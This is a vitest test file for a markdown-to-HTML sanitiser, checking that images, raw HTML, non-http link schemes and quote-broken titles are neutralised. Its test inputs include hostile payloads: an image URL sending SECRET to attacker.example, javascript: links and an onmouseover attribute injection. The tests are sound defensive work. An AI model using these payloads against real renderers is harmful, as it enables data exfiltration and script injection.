import { describe, it, expect } from 'vitest';
import { markdownToHtml, escapeHtml } from '../markdown';

describe('markdownToHtml', () => {
  it('still renders ordinary markdown', () => {
    const html = markdownToHtml('**bold** and `code`\n\n- one\n- two');
    expect(html).toContain('<strong>bold</strong>');
    expect(html).toContain('<code>code</code>');
    expect(html).toContain('<li>one</li>');
  });

  it('never turns a markdown image into an <img>', () => {
    const html = markdownToHtml('![chart](https://attacker.example/c?d=SECRET)');
    expect(html).not.toContain('<img');
    expect(html).not.toContain('attacker.example');
    expect(html).toContain('chart');
  });

  it('shows raw HTML as text instead of parsing it', () => {
    const html = markdownToHtml(
      'Hi <img src="https://attacker.example/p"> <iframe src="https://attacker.example"></iframe>\n\n<div onclick="x()">block</div>',
    );
    expect(html).not.toMatch(/<(img|iframe|div)\b/);
    expect(html).toContain('&lt;img src=&quot;https://attacker.example/p&quot;&gt;');
    expect(html).toContain('&lt;div onclick=&quot;x()&quot;&gt;');
  });

  it('keeps http(s) and mailto links, opened in a new tab without a referrer', () => {
    const html = markdownToHtml('[docs](https://example.com/a?b=1&c=2) <mailto:me@example.com>');
    expect(html).toContain('<a href="https://example.com/a?b=1&amp;c=2" target="_blank" rel="noopener noreferrer">docs</a>');
    expect(html).toContain('href="mailto:me@example.com"');
  });

  it('drops links with other schemes but keeps their text', () => {
    for (const href of ['javascript:alert(1)', 'data:text/html,<b>x</b>', 'chrome-extension://abc/x.html', 'JaVaScRiPt:alert(1)']) {
      const html = markdownToHtml(`[click](${href})`);
      expect(html).not.toContain('<a');
      expect(html).toContain('click');
    }
  });

  it('does not load an image wrapped in a link', () => {
    const html = markdownToHtml('[![logo](https://attacker.example/i.png)](https://example.com)');
    expect(html).not.toContain('<img');
    expect(html).not.toContain('attacker.example');
  });

  it('escapes quotes in link titles', () => {
    const html = markdownToHtml('[x](https://example.com "a\\" onmouseover=\\"b")');
    expect(html).not.toMatch(/title="[^"]*" onmouseover=/);
  });
});

describe('escapeHtml', () => {
  it('escapes the characters that matter in text and attributes', () => {
    expect(escapeHtml(`<a href="x" title='y'>&`)).toBe('&lt;a href=&quot;x&quot; title=&#39;y&#39;&gt;&amp;');
  });
});
